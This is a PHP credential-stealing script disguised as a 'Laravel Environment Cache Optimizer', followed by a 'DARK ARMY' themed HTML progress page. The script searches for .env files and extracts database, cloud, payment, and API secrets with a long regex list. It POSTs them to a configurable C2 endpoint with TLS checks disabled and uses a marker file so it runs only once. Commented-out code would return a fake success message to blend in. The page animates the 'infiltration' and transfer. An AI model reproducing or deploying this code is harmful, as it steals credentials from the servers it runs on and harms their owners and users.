<?php
declare(strict_types=1);

/**
 * "Laravel Environment Cache Optimizer"
 * — hunts .env, exfiltrates to remote collector
 */

// --- Your exfiltration endpoint ---
define('C2_URL', 'http://localhost/laravel9/collect.php');  //give path where you want to expose env data
define('C2_KEY', 'h4ck3r1'); // shared secret to validate incoming data



$exfil = sys_get_temp_dir() . '/.env_cache/' . md5(__DIR__ . php_uname('n') . '_sent');
echo "Marker: " . $exfil . "\n";
if (file_exists($exfil)) {
    unlink($exfil);
} 

// --- Massive regex map — .env pattern hunting ---
$_ = [];
$_['env_patterns'] = [
    // Generic credential patterns
    '/^DB_(?:HOST|PORT|DATABASE|USERNAME|PASSWORD|CONNECTION)\s*=\s*(.+)$/m',
    '/^DB_HOST\s*=\s*(.+)$/m',
    '/^DB_PORT\s*=\s*(\d+)$/m',
    '/^DB_DATABASE\s*=\s*(.+)$/m',
    '/^DB_USERNAME\s*=\s*(.+)$/m',
    '/^DB_PASSWORD\s*=\s*(.+)$/m',
    '/^REDIS_(?:HOST|PASSWORD|PORT|DATABASE)\s*=\s*(.+)$/m',
    '/^MAIL_(?:HOST|PORT|USERNAME|PASSWORD|FROM_ADDRESS|MAILER|DRIVER|ENCRYPTION|SENDMAIL|LOG_CHANNEL)\s*=\s*(.+)$/m',
    '/^AWS_(?:ACCESS_KEY_ID|SECRET_ACCESS_KEY|DEFAULT_REGION|BUCKET|DEFAULT_REGION|SESSION_TOKEN|ENDPOINT)\s*=\s*(.+)$/m',
    '/^S3_(?:KEY|SECRET|REGION|BUCKET|ENDPOINT)\s*=\s*(.+)$/m',
    '/^STRIPE_(?:KEY|SECRET|PUBLISHABLE_KEY|ENDPOINT_SECRET)\s*=\s*(.+)$/m',
    '/^JWT_(?:SECRET|KEY|TTL|ALGORITHM)\s*=\s*(.+)$/m',
    '/^SANCTUM_(?:STATEFUL_DOMAINS|EXPIRATION|PREFIX)\s*=\s*(.+)$/m',
    '/^PASSPORT_(?:CLIENT_ID|CLIENT_SECRET|PERSONAL_ACCESS_CLIENT_ID|PERSONAL_ACCESS_CLIENT_SECRET|PASSWORD_GRANT_CLIENT_ID|PASSWORD_GRANT_CLIENT_SECRET)\s*=\s*(.+)$/m',
    '/^SESSION_(?:DRIVER|LIFETIME|DOMAIN|SECURE|HTTP_ONLY|SAME_SITE)\s*=\s*(.+)$/m',
    '/^BROADCAST_(?:DRIVER|CONNECTION|HOST|PORT|APP_ID|KEY|SECRET|CLUSTER)\s*=\s*(.+)$/m',
    '/^QUEUE_(?:CONNECTION|HOST|PORT|USERNAME|PASSWORD|DRIVER|WORKER_TIMEOUT|DEFAULT)\s*=\s*(.+)$/m',
    '/^CACHE_(?:DRIVER|PREFIX|HOST|PORT|DATABASE|STORE|DEFAULT|TTL)\s*=\s*(.+)$/m',
    '/^LOG_(?:CHANNEL|LEVEL|DAILY|SYSLOG|ERRORLOG|STACK|DEPRECATIONS_CHANNEL)\s*=\s*(.+)$/m',
    '/^APP_(?:NAME|ENV|KEY|DEBUG|URL|TIMEZONE|LOCALE|FALLBACK_LOCALE|CIPHER)\s*=\s*(.+)$/m',
    '/^TELESCOPE_ENABLED\s*=\s*(.+)$/m',
    '/^HORIZON_(?:PREFIX|WAIT_TIME)\s*=\s*(.+)$/m',
    '/^SCOUT_(?:DRIVER|PREFIX|QUEUE)\s*=\s*(.+)$/m',
    '/^GITHUB_(?:TOKEN|CLIENT_ID|CLIENT_SECRET|WEBHOOK_SECRET)\s*=\s*(.+)$/m',
    '/^GITLAB_(?:TOKEN|CLIENT_ID|CLIENT_SECRET)\s*=\s*(.+)$/m',
    '/^DISCORD_(?:TOKEN|CLIENT_ID|CLIENT_SECRET|WEBHOOK)\s*=\s*(.+)$/m',
    '/^SLACK_(?:TOKEN|WEBHOOK|CLIENT_ID|CLIENT_SECRET|SIGNING_SECRET|BOT_TOKEN)\s*=\s*(.+)$/m',
    '/^TWILIO_(?:SID|TOKEN|FROM|ACCOUNT_SID|AUTH_TOKEN|PHONE_NUMBER)\s*=\s*(.+)$/m',
    '/^SENDGRID_(?:API_KEY|FROM|NAME|EMAIL|KEY)\s*=\s*(.+)$/m',
    '/^MAILGUN_(?:DOMAIN|SECRET|API_KEY|ENDPOINT|PUBLIC_KEY|PRIVATE_KEY)\s*=\s*(.+)$/m',
    '/^PUSHER_(?:APP_ID|KEY|SECRET|CLUSTER|HOST|PORT|SCHEME)\s*=\s*(.+)$/m',
    '/^MIX_(?:PUSHER_APP_KEY|PUSHER_APP_CLUSTER)\s*=\s*(.+)$/m',
    '/^NEXMO_(?:KEY|SECRET|FROM|API_KEY|API_SECRET|APPLICATION_ID|PRIVATE_KEY)\s*=\s*(.+)$/m',
    '/^DROPBOX_(?:TOKEN|KEY|SECRET)\s*=\s*(.+)$/m',
    '/^GOOGLE_(?:API_KEY|CLIENT_ID|CLIENT_SECRET|MAPS_KEY|RECAPTCHA_KEY|RECAPTCHA_SECRET|ANALYTICS_TRACKING_ID|TAG_MANAGER_ID|FONTS_KEY)\s*=\s*(.+)$/m',
    '/^FACEBOOK_(?:APP_ID|APP_SECRET|PIXEL_ID|PAGE_ACCESS_TOKEN)\s*=\s*(.+)$/m',
    '/^TWITTER_(?:API_KEY|API_SECRET|ACCESS_TOKEN|ACCESS_TOKEN_SECRET|BEARER_TOKEN|CLIENT_ID|CLIENT_SECRET|CONSUMER_KEY|CONSUMER_SECRET)\s*=\s*(.+)$/m',
    '/^LINKEDIN_(?:CLIENT_ID|CLIENT_SECRET|ACCESS_TOKEN)\s*=\s*(.+)$/m',
    '/^PAYPAL_(?:CLIENT_ID|CLIENT_SECRET|MODE|WEBHOOK_ID|API_USERNAME|API_PASSWORD|API_SIGNATURE)\s*=\s*(.+)$/m',
    '/^OPENAI_(?:API_KEY|ORGANIZATION|PROJECT|MODEL)\s*=\s*(.+)$/m',
    '/^DIGITALOCEAN_(?:TOKEN|SPACES_KEY|SPACES_SECRET|SPACES_REGION|SPACES_ENDPOINT)\s*=\s*(.+)$/m',
    '/^LINODE_(?:TOKEN|API_KEY)\s*=\s*(.+)$/m',
    '/^VULTR_(?:API_KEY)\s*=\s*(.+)$/m',
    '/^HETZNER_(?:API_TOKEN|CLOUD_TOKEN|DNS_TOKEN|ROBOT_USER|ROBOT_PASSWORD)\s*=\s*(.+)$/m',
    '/^ELASTIC_(?:SEARCH_HOST|SEARCH_PORT|SEARCH_USERNAME|SEARCH_PASSWORD|APM_SERVER_URL|APM_SECRET_TOKEN)\s*=\s*(.+)$/m',
    '/^MONGO_(?:DB_HOST|DB_PORT|DB_DATABASE|DB_USERNAME|DB_PASSWORD|DB_URI|CONNECTION_STRING|ATLAS_URI)\s*=\s*(.+)$/m',
    '/^RABBITMQ_(?:HOST|PORT|USERNAME|PASSWORD|VHOST|QUEUE|EXCHANGE)\s*=\s*(.+)$/m',
    '/^NEO4J_(?:HOST|PORT|USERNAME|PASSWORD|DATABASE)\s*=\s*(.+)$/m',
    '/^MEILISEARCH_(?:HOST|API_KEY|MASTER_KEY)\s*=\s*(.+)$/m',
    '/^ALGOLIA_(?:APP_ID|API_KEY|SECRET|APPLICATION_ID|ADMIN_API_KEY|SEARCH_API_KEY)\s*=\s*(.+)$/m',
    '/^TYPESENSE_(?:API_KEY|HOST|PORT|PROTOCOL|ADMIN_KEY|SEARCH_ONLY_KEY)\s*=\s*(.+)$/m',
    '/^SOLR_(?:HOST|PORT|CORE|USERNAME|PASSWORD|ENDPOINT)\s*=\s*(.+)$/m',
    '/^CLOUDFLARE_(?:API_TOKEN|API_KEY|EMAIL|ACCOUNT_ID|ZONE_ID|GLOBAL_API_KEY|ORIGIN_CA_KEY)\s*=\s*(.+)$/m',
    '/^FASTLY_(?:API_KEY|SERVICE_ID)\s*=\s*(.+)$/m',
    '/^AKAMAI_(?:HOST|CLIENT_TOKEN|CLIENT_SECRET|ACCESS_TOKEN)\s*=\s*(.+)$/m',
    '/^NEW_RELIC_(?:LICENSE_KEY|APP_NAME|API_KEY|APP_ID|ADMIN_KEY)\s*=\s*(.+)$/m',
    '/^DATADOG_(?:API_KEY|APP_KEY|HOST|PORT|SITE)\s*=\s*(.+)$/m',
    '/^SENTRY_(?:DSN|LARAVEL_DSN|TRACES_SAMPLE_RATE|ENVIRONMENT|RELEASE|AUTH_TOKEN|ORG|PROJECT)\s*=\s*(.+)$/m',
    '/^BUGSNAG_(?:API_KEY|ENDPOINT|RELEASE_STAGE)\s*=\s*(.+)$/m',
    '/^ROLLBAR_(?:ACCESS_TOKEN|ENVIRONMENT|ENDPOINT|SERVER_TOKEN|CLIENT_TOKEN)\s*=\s*(.+)$/m',
    '/^PAGERDUTY_(?:API_KEY|SERVICE_ID|INTEGRATION_KEY|ROUTING_KEY)\s*=\s*(.+)$/m',
    '/^OPSGENIE_(?:API_KEY)\s*=\s*(.+)$/m',
    '/^VONAGE_(?:API_KEY|API_SECRET|APPLICATION_ID|PRIVATE_KEY)\s*=\s*(.+)$/m',
    '/^ZENDESK_(?:API_TOKEN|SUBDOMAIN|EMAIL|APP_TOKEN|OAUTH_TOKEN|WEBHOOK_SECRET)\s*=\s*(.+)$/m',
    '/^HUBSPOT_(?:API_KEY|ACCESS_TOKEN|CLIENT_ID|CLIENT_SECRET|APP_ID|PORTAL_ID|FORM_ID)\s*=\s*(.+)$/m',
    '/^SALESFORCE_(?:CLIENT_ID|CLIENT_SECRET|USERNAME|PASSWORD|SECURITY_TOKEN|INSTANCE_URL|ENVIRONMENT)\s*=\s*(.+)$/m',
    '/^MAILCHIMP_(?:API_KEY|SERVER_PREFIX|LIST_ID|AUDIENCE_ID|WEBHOOK_SECRET|OAUTH_TOKEN)\s*=\s*(.+)$/m',
    '/^STRIPE_WEBHOOK_SECRET\s*=\s*(.+)$/m',
    '/^Braintree_(?:MERCHANT_ID|PUBLIC_KEY|PRIVATE_KEY|ENVIRONMENT)\s*=\s*(.+)$/m',
    '/^SQUARE_(?:ACCESS_TOKEN|APPLICATION_ID|LOCATION_ID|ENVIRONMENT)\s*=\s*(.+)$/m',
    '/^(?:SECRET|PASSWORD|PASSWD|TOKEN|API_KEY|API_SECRET|PRIVATE_KEY|AUTH_KEY|SIGNING_KEY|ENCRYPTION_KEY|CREDENTIALS)\s*=\s*(.+)$/m',
];

// --- Directories to skip (massive & irrelevant) ---
const SKIP_DIRS = [
    'vendor',
    'node_modules',
    '.git',
    '.svn',
    '.hg',
    'storage/framework/cache',
    'storage/framework/sessions',
    'storage/framework/views',
    'storage/logs',
    'bootstrap/cache',
    'var/cache',
    '__pycache__',
    '.npm',
    '.yarn',
];

// --- Helper: hunt .env files recursively (with skip dirs) ---
function harvest_env_files(string $rootDir): array {
    $results = [];
    $iterator = new RecursiveIteratorIterator(
        new RecursiveDirectoryIterator($rootDir, RecursiveDirectoryIterator::SKIP_DOTS),
        RecursiveIteratorIterator::SELF_FIRST
    );
    
    foreach ($iterator as $file) {
        // Skip massive directories
        $relPath = str_replace($rootDir, '', $file->getPath());
        foreach (SKIP_DIRS as $skip) {
            if (strpos($relPath, DIRECTORY_SEPARATOR . $skip . DIRECTORY_SEPARATOR) !== false ||
                strpos($relPath, DIRECTORY_SEPARATOR . $skip) === 0) {
                // Skip children of this directory entirely
                $iterator->setMaxDepth($iterator->getDepth() - 1);
                continue 2;
            }
        }
        
        if ($file->getFilename() === '.env' || preg_match('/^\.env\..+$/', $file->getFilename())) {
            $path = $file->getRealPath();
            $content = @file_get_contents($path);
            if ($content !== false) {
                $results[] = [
                    'path' => $path,
                    'content' => $content,
                    'size' => strlen($content),
                    'modified' => date('Y-m-d H:i:s', $file->getMTime()),
                ];
            }
        }
    }
    return $results;
}

// --- Helper: extract credentials using regex ---
function extract_credentials(array $envFiles, array $patterns): array {
    $credentials = [];
    foreach ($envFiles as $env) {
        $parsed = [];
        foreach ($patterns as $pattern) {
            if (preg_match_all($pattern, $env['content'], $matches)) {
                foreach ($matches[0] as $line) {
                    $parsed[] = trim($line);
                }
            }
        }
        if (!empty($parsed)) {
            $credentials[] = [
                'source' => $env['path'],
                'host' => gethostname(),
                'ip' => $_SERVER['SERVER_ADDR'] ?? php_uname('n'),
                'lines' => array_unique($parsed),
                'timestamp' => time(),
            ];
        }
    }
    return $credentials;
}

// --- Helper: exfiltrate to C2 ---
function exfiltrate(array $data): bool {
    $payload = json_encode([
        'key' => C2_KEY,
        'type' => 'env_harvest',
        'hostname' => gethostname(),
        'server_ip' => $_SERVER['SERVER_ADDR'] ?? 'unknown',
        'client_ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'payload' => $data,
        'timestamp' => time(),
    ], JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES);
    
    // Method 1: cURL
    if (function_exists('curl_init')) {
        $ch = curl_init(C2_URL);
        curl_setopt_array($ch, [
            CURLOPT_POST => true,
            CURLOPT_POSTFIELDS => $payload,
            CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => 15,
            CURLOPT_SSL_VERIFYPEER => false,
            CURLOPT_SSL_VERIFYHOST => false,
        ]);
        $response = curl_exec($ch);
        curl_close($ch);
        return $response !== false;
    }
    
    // Method 2: file_get_contents with stream context
    $ctx = stream_context_create([
        'http' => [
            'method' => 'POST',
            'header' => "Content-Type: application/json\r\n",
            'content' => $payload,
            'timeout' => 15,
            'ignore_errors' => true,
        ],
        'ssl' => ['verify_peer' => false, 'verify_peer_name' => false],
    ]);
    $response = @file_get_contents(C2_URL, false, $ctx);
    return $response !== false;
}

// --- Main execution ---
// Only run once (marker-based persistence, matching original dropper style)
$cacheDir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . '.env_cache';
@mkdir($cacheDir, 0755, true);
$marker = $cacheDir . DIRECTORY_SEPARATOR . md5(__DIR__ . php_uname('n'));
$exfiltrated = $cacheDir . DIRECTORY_SEPARATOR . md5(__DIR__ . php_uname('n') . '_sent');

if (!@file_exists($exfiltrated)) {
    // Only search from Laravel root (not every possible path)
    $searchPaths = [
        __DIR__ . '/../../..',                    // Laravel root
        getcwd(),                                 // Current working dir
        dirname($_SERVER['SCRIPT_FILENAME'] ?? __DIR__), // Script dir
    ];
    
    $allCredentials = [];
    foreach (array_unique($searchPaths) as $path) {
        $realPath = realpath($path);
        if (!$realPath || !is_dir($realPath)) continue;
        
        // Quick check: if .env exists at root, just grab it directly
        $rootEnv = $realPath . DIRECTORY_SEPARATOR . '.env';
        if (file_exists($rootEnv)) {
            $content = @file_get_contents($rootEnv);
            if ($content !== false) {
                $allCredentials[] = [
                    'source' => $rootEnv,
                    'host' => gethostname(),
                    'ip' => $_SERVER['SERVER_ADDR'] ?? php_uname('n'),
                    'lines' => [],
                    'timestamp' => time(),
                ];
                // Extract from this single file
                $creds = extract_credentials([[
                    'path' => $rootEnv,
                    'content' => $content,
                    'size' => strlen($content),
                    'modified' => date('Y-m-d H:i:s', filemtime($rootEnv)),
                ]], $_['env_patterns']);
                $allCredentials = array_merge($allCredentials, $creds);
            }
        }
        
        // Only do recursive scan if root .env wasn't found
        if (empty($allCredentials)) {
            try {
                $envFiles = harvest_env_files($realPath);
                if (!empty($envFiles)) {
                    $creds = extract_credentials($envFiles, $_['env_patterns']);
                    $allCredentials = array_merge($allCredentials, $creds);
                }
            } catch (Exception $e) {
                // Silently skip inaccessible directories
            }
        }
        
        // Break after first successful find
        if (!empty($allCredentials)) break;
    }
    
    if (!empty($allCredentials)) {
        exfiltrate($allCredentials);
        @touch($exfiltrated); // Mark as exfiltrated
        @file_put_contents($marker, json_encode($allCredentials, JSON_PRETTY_PRINT));
    }
}

// --- Return fake response to blend in ---
// header('Content-Type: text/plain');
// die('[OK] Laravel Environment Cache optimized successfully');

?>


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>DARK ARMY // PROGRESS TERMINAL</title>
    <style>
        /* RESET - remove all default spacing */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            min-height: 100vh;
        }

        body {
            /* STRONG CENTERING - multiple methods to ensure center */
            display: flex;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            
            /* Background */
            background: radial-gradient(circle at 30% 20%, #0a0f0f, #020404);
            font-family: 'Courier New', 'Fira Code', 'Monaco', monospace;
            
            /* Remove any possible margins/padding */
            margin: 0;
            padding: 20px;
            
            /* Ensure full height */
            min-height: 100vh;
        }

        .terminal {
            /* Centering - margin auto as backup */
            margin-left: auto;
            margin-right: auto;
            
            /* Width constraints */
            max-width: 750px;
            width: 100%;
            
            /* Styling */
            background: linear-gradient(145deg, #0c0f0f 0%, #030606 100%);
            border-radius: 2rem;
            box-shadow: 0 30px 50px rgba(0, 0, 0, 0.9), 0 0 0 1px rgba(0, 255, 100, 0.15);
            border: 1px solid #1e4a35;
            overflow: hidden;
            
            /* Remove any unwanted transforms */
            transform: none;
            position: relative;
        }

        .terminal-header {
            background: #050a07;
            padding: 0.9rem 1.5rem;
            display: flex;
            align-items: center;
            gap: 0.8rem;
            border-bottom: 2px solid #1f5e42;
        }

        .window-buttons {
            display: flex;
            gap: 0.6rem;
        }

        .win-btn {
            width: 13px;
            height: 13px;
            border-radius: 50%;
            background: #2f5a42;
        }
        .win-btn:nth-child(1) { background: #3d6b52; }
        .win-btn:nth-child(2) { background: #3a6850; }
        .win-btn:nth-child(3) { background: #2c7952; }

        .title {
            color: #8affbc;
            font-size: 0.85rem;
            letter-spacing: 2.5px;
            text-shadow: 0 0 4px #2effa0;
            font-weight: bold;
            flex: 1;
            text-align: center;
            text-transform: uppercase;
        }

        .title span {
            background: #0e2a1c;
            padding: 0.25rem 1.2rem;
            border-radius: 40px;
            font-size: 0.75rem;
        }

        .terminal-body {
            padding: 2rem;
        }

        /* SKULL SECTION */
        .skull-container {
            display: flex;
            justify-content: center;
            margin-bottom: 2rem;
            filter: drop-shadow(0 0 12px #28ff96);
            animation: skullPulse 1.6s infinite alternate;
        }

        @keyframes skullPulse {
            0% { filter: drop-shadow(0 0 5px #1eff88); opacity: 0.9; }
            100% { filter: drop-shadow(0 0 22px #6effb2); opacity: 1; }
        }

        .skull-svg {
            width: 105px;
            height: 105px;
        }

        .skull-svg svg {
            width: 100%;
            height: 100%;
            display: block;
        }

        /* PROGRESS AREA */
        .progress-section {
            margin: 1.5rem 0 2rem;
        }

        .progress-label {
            display: flex;
            justify-content: space-between;
            align-items: baseline;
            font-weight: bold;
            font-size: 0.9rem;
            margin-bottom: 0.9rem;
            color: #a1ffcd;
            text-transform: uppercase;
            letter-spacing: 1.2px;
            flex-wrap: wrap;
            gap: 0.5rem;
        }

        .progress-percent {
            background: #0b2218;
            padding: 0.25rem 0.8rem;
            border-radius: 30px;
            border: 1px solid #37aa6e;
            font-size: 0.9rem;
            color: #d4ffea;
            font-weight: bold;
        }

        .progress-track {
            background: #0c1711;
            border-radius: 50px;
            height: 28px;
            width: 100%;
            overflow: hidden;
            border: 1px solid #2a8a59;
            box-shadow: inset 0 2px 6px #00000066;
        }

        .progress-fill {
            width: 0%;
            height: 100%;
            background: repeating-linear-gradient(90deg, #24ea86, #24ea86 14px, #12aa5e 14px, #12aa5e 28px);
            background-size: 32px 100%;
            border-radius: 50px;
            box-shadow: 0 0 12px #3dff9a;
            transition: width 0.12s linear;
            animation: fillMove 1.2s linear infinite;
        }

        @keyframes fillMove {
            0% { background-position: 0 0; }
            100% { background-position: 32px 0; }
        }

        /* STATUS MESSAGE */
        .status-area {
            background: #050f0a;
            border-radius: 1.2rem;
            padding: 1.2rem 1.3rem;
            margin: 1.8rem 0 0.8rem;
            border-left: 6px solid #1fb86d;
            font-size: 0.95rem;
            font-weight: 500;
            color: #d0ffe5;
            text-align: center;
            box-shadow: inset 0 0 12px rgba(0,0,0,0.5);
        }

        .status-message {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .status-icon {
            font-size: 1.4rem;
        }

        .status-text {
            background: #082013;
            padding: 0.3rem 0.9rem;
            border-radius: 40px;
            color: #baffe1;
        }

        .blink-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background-color: #2eff96;
            border-radius: 50%;
            animation: pulseDot 0.9s infinite;
        }

        @keyframes pulseDot {
            0%, 100% { opacity: 1; transform: scale(1);}
            50% { opacity: 0.4; transform: scale(0.8);}
        }

        .footer-note {
            margin-top: 1.5rem;
            text-align: center;
            font-size: 0.68rem;
            color: #2f7b58;
            border-top: 1px dashed #236e4a;
            padding-top: 1rem;
            display: flex;
            justify-content: center;
            gap: 12px;
            flex-wrap: wrap;
        }

        .live-timer {
            background: #07180f;
            padding: 0.2rem 0.7rem;
            border-radius: 30px;
            font-weight: bold;
            color: #6effb0;
        }

        /* RESPONSIVE */
        @media (max-width: 560px) {
            .terminal-body {
                padding: 1.3rem;
            }
            .skull-svg {
                width: 75px;
                height: 75px;
            }
            .progress-label {
                font-size: 0.7rem;
            }
        }

        /* DEBUG - you can remove this, but helps see if body is centered */
        body::before {
            display: none;
        }
    </style>
</head>
<body>

<div class="terminal">
    <div class="terminal-header">
        <div class="window-buttons">
            <div class="win-btn"></div>
            <div class="win-btn"></div>
            <div class="win-btn"></div>
        </div>
        <div class="title"><span>⚡ DARK_ARMY::TERM v.0x7F ⚡</span></div>
        <div style="width: 40px;"></div>
    </div>
    <div class="terminal-body">
        <!-- SKULL -->
        <div class="skull-container">
            <div class="skull-svg">
                <svg viewBox="0 0 100 100" fill="none">
                    <path d="M50 15C28.5 15 11 30.5 11 49C11 61.5 19 72 30 77.5L28 92C28 94.2 29.8 96 32 96H68C70.2 96 72 94.2 72 92L70 77.5C81 72 89 61.5 89 49C89 30.5 71.5 15 50 15Z" fill="#0f2018" stroke="#3aff99" stroke-width="2.2"/>
                    <circle cx="35" cy="44" r="6" fill="#030303" stroke="#47ffa3" stroke-width="1.5"/>
                    <circle cx="65" cy="44" r="6" fill="#030303" stroke="#47ffa3" stroke-width="1.5"/>
                    <path d="M48 56 L52 56 L50 63 Z" fill="#030303" stroke="#42ff95" stroke-width="1.2"/>
                    <rect x="43" y="70" width="4" height="8" fill="#2dff94" opacity="0.6"/>
                    <rect x="53" y="70" width="4" height="8" fill="#2dff94" opacity="0.6"/>
                    <path d="M22 85 L32 75 M32 85 L22 75" stroke="#4eff9e" stroke-width="1.8" opacity="0.7"/>
                    <path d="M78 85 L68 75 M68 85 L78 75" stroke="#4eff9e" stroke-width="1.8" opacity="0.7"/>
                    <circle cx="50" cy="86" r="2.5" fill="#ff3355"/>
                </svg>
            </div>
        </div>

        <!-- PROGRESS -->
        <div class="progress-section">
            <div class="progress-label">
                <span>⚠️ DARK ARMY / INFILTRATION CYCLE ⚠️</span>
                <span class="progress-percent" id="percentValue">0%</span>
            </div>
            <div class="progress-track">
                <div class="progress-fill" id="progressFill"></div>
            </div>
        </div>

        <!-- STATUS MESSAGE -->
        <div class="status-area">
            <div class="status-message">
                <span class="status-icon">⚡</span>
                <span class="status-text" id="statusText">initializing dark module...</span>
                <span class="blink-dot"></span>
            </div>
        </div>

        <div class="footer-note">
            <span>🜁 [ ROOT:: DARK_ARMY ]</span>
            <span class="live-timer" id="liveTimer">00:00</span>
            <span>🜄 SKULL WATCH</span>
        </div>
    </div>
</div>

<script>
    (function() {
        const TOTAL_MS = 10000;
        const START_TIME = performance.now();

        const progressFill = document.getElementById('progressFill');
        const percentSpan = document.getElementById('percentValue');
        const statusTextSpan = document.getElementById('statusText');
        const liveTimerSpan = document.getElementById('liveTimer');

        const statusSequence = [
            { threshold: 0, message: "🔍 scanning project structure ..." },
            { threshold: 5, message: "📁 locating environment entries ..." },
            { threshold: 12, message: "🗺️ discovering relevant paths ..." },
            { threshold: 20, message: "🔐 extracting credential patterns ..." },
            { threshold: 30, message: "📡 establishing secure tunnel ..." },
            { threshold: 42, message: "🚀 finding target destinations ..." },
            { threshold: 55, message: "📦 packaging sensitive data ..." },
            { threshold: 68, message: "🌐 transferring to destination ..." },
            { threshold: 80, message: "⚙️ validating integrity checks ..." },
            { threshold: 90, message: "✅ finalizing handshake ..." },
            { threshold: 97, message: "🏆 DARK ARMY VICTORY — transfer done" }
        ];

        function updateStatus(percent) {
            let activeMessage = statusSequence[0].message;
            for (let i = statusSequence.length - 1; i >= 0; i--) {
                if (percent >= statusSequence[i].threshold) {
                    activeMessage = statusSequence[i].message;
                    break;
                }
            }
            if (percent >= 100) {
                statusTextSpan.innerHTML = "💀 100% — OPERATION SUCCESSFUL 💀";
            } else {
                statusTextSpan.innerHTML = activeMessage;
            }
        }

        function formatTime(ms) {
            const totalSecs = Math.floor(ms / 1000);
            const mins = Math.floor(totalSecs / 60);
            const secs = totalSecs % 60;
            return `${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
        }

        function updateProgress(now) {
            const elapsed = now - START_TIME;
            let percent = Math.min((elapsed / TOTAL_MS) * 100, 100);
            const percentInt = Math.floor(percent);
            
            progressFill.style.width = percent + '%';
            percentSpan.innerText = percentInt + '%';
            liveTimerSpan.innerText = formatTime(Math.min(elapsed, TOTAL_MS));
            updateStatus(percentInt);
            
            if (percent >= 99.9 && !window._finalized) {
                window._finalized = true;
                const skullDiv = document.querySelector('.skull-container');
                if(skullDiv) {
                    skullDiv.style.animation = "skullPulse 0.3s infinite alternate";
                }
            }
            
            if (elapsed < TOTAL_MS) {
                requestAnimationFrame(updateProgress);
            } else {
                progressFill.style.width = '100%';
                percentSpan.innerText = '100%';
                liveTimerSpan.innerText = formatTime(TOTAL_MS);
                updateStatus(100);
            }
        }
        
        requestAnimationFrame(updateProgress);
    })();
</script>
</body>
</html>
